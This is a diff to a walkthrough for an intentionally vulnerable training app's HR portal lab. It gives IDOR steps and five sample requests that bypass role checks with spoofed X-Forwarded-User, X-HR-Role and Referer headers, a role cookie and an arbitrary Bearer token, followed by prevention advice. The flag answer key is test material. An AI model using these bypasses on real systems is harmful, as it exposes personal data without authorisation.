@@ -641,31 +641,123 @@ GET /api/healthcare-secure/export?role=admin
 ## Lab 7: Broken Access Control - HR Portal
 
 **URL:** `/labs/beginner/access-control`
-**API Endpoint:** `GET /api/labs/access/users/:id`
-**Scenario:** HR system with improper authorization checks
+**Vulnerable Pages:**
+- `GET /vuln/hr/portal` - Easy mode vulnerable HR portal
+- `GET /vuln/hr-secure/portal` - Hard mode with RBAC protections
 
-### Exploitation Steps
+**Scenario:** TechCorp HR Portal with IDOR vulnerabilities exposing employee salary, SSN, and bank account data
 
-1. Log in as a regular employee (User ID: 10)
-2. View your own profile (normal behavior)
-3. Modify the user ID in the URL to access other profiles
-4. Access executive profiles with sensitive salary data
+---
 
-**IDOR Attack:**
+### Easy Mode - IDOR Exploitation
+
+Select "Easy Mode" tab. You are logged in as John Doe (Employee #10, regular employee).
+
+**Step 1: Explore the Portal**
+Click "Employee Directory" to see all employee IDs revealed.
+
+**Step 2: IDOR Attack**
+Change the ID in the URL to access other employee profiles:
 ```
-GET /api/labs/access/users/1   (CEO profile)
-GET /api/labs/access/users/2   (CFO profile)
-GET /api/labs/access/users/3   (HR Director)
+/vuln/hr/profile/1   → CEO James Harrison ($500k salary, SSN exposed)
+/vuln/hr/profile/2   → CFO Linda Chen ($400k salary)
+/vuln/hr/profile/3   → HR Director Robert Williams
+/vuln/hr/profile/4   → IT Admin Mike Brown
+/vuln/hr/profile/15  → Jane Smith (peer employee)
 ```
 
-### Flags
-- `FLAG{IDOR_PRIVILEGE_ESCALATION}` - Accessing admin/manager profiles
-- `FLAG{IDOR_HORIZONTAL_ACCESS}` - Accessing peer employee profiles
+**Step 3: Hidden Admin Endpoint**
+Check page source for hidden endpoint:
+```
+GET /vuln/hr/admin/employees
+```
+Returns all employee data as JSON.
+
+**Easy Mode Flags:**
+| Endpoint/Action | Flag |
+|-----------------|------|
+| Access admin/manager profile | `FLAG{IDOR_PRIVILEGE_ESCALATION}` |
+| Access peer employee profile | `FLAG{IDOR_HORIZONTAL_ACCESS}` |
+| Employee directory exposed | `FLAG{DIRECTORY_ENUMERATION_ENABLED}` |
+| Admin panel without auth | `FLAG{ADMIN_PANEL_NO_AUTH}` |
+
+---
+
+### Hard Mode - Bypass RBAC
+
+Select "Hard (Bypass RBAC)" tab. This mode has role-based access controls.
+
+**Protected Endpoints:**
+- `/api/hr-secure/profile/:id` - Other profiles blocked
+- `/api/hr-secure/employees` - Admin only
+- `/api/hr-secure/salaries` - Manager/admin only
+
+**Bypass 1: X-Forwarded-User Header**
+```
+GET /api/hr-secure/profile/1
+X-Forwarded-User: admin
+```
+**Flag:** `FLAG{RBAC_BYPASS_FORWARDED_USER}`
+
+**Bypass 2: Role Cookie Manipulation**
+```
+GET /api/hr-secure/profile/1
+Cookie: hr_role=admin
+```
+**Flag:** `FLAG{RBAC_BYPASS_ROLE_COOKIE}`
+
+**Bypass 3: X-HR-Role Header Injection**
+```
+GET /api/hr-secure/profile/1
+X-HR-Role: admin
+```
+**Flag:** `FLAG{RBAC_BYPASS_ROLE_HEADER}`
+
+**Bypass 4: Referer Header Bypass**
+```
+GET /api/hr-secure/employees
+Referer: https://site.com/admin
+```
+**Flag:** `FLAG{RBAC_BYPASS_REFERER}`
+
+**Bypass 5: Bearer Token Bypass**
+```
+GET /api/hr-secure/salaries
+Authorization: Bearer anything
+```
+**Flag:** `FLAG{SALARY_BYPASS_BEARER_TOKEN}`
+
+---
+
+### All Flags Summary
+
+**Easy Mode (4 flags):**
+| Flag | Description |
+|------|-------------|
+| `FLAG{IDOR_PRIVILEGE_ESCALATION}` | Access admin/manager profile |
+| `FLAG{IDOR_HORIZONTAL_ACCESS}` | Access peer employee profile |
+| `FLAG{DIRECTORY_ENUMERATION_ENABLED}` | Full directory exposed |
+| `FLAG{ADMIN_PANEL_NO_AUTH}` | Admin endpoint no auth |
+
+**Hard Mode (7 flags):**
+| Flag | Description |
+|------|-------------|
+| `FLAG{RBAC_BYPASS_FORWARDED_USER}` | X-Forwarded-User bypass |
+| `FLAG{RBAC_BYPASS_ROLE_COOKIE}` | Cookie manipulation |
+| `FLAG{RBAC_BYPASS_ROLE_HEADER}` | X-HR-Role header |
+| `FLAG{RBAC_BYPASS_REFERER}` | Referer header bypass |
+| `FLAG{EMPLOYEES_BYPASS_ROLE_HEADER}` | Employee list via header |
+| `FLAG{EMPLOYEES_BYPASS_ROLE_COOKIE}` | Employee list via cookie |
+| `FLAG{SALARY_BYPASS_BEARER_TOKEN}` | Salary data via Bearer |
+
+**Total: 11 flags for Broken Access Control lab**
 
 ### Prevention
-- Implement proper authorization checks
-- Use indirect object references
-- Validate user permissions for each request
+- Implement server-side authorization checks (don't trust client data)
+- Don't rely on headers like X-Forwarded-User for auth
+- Use secure session management (signed cookies)
+- Validate permissions on every request
+- Use indirect object references instead of sequential IDs
 
 ---
 
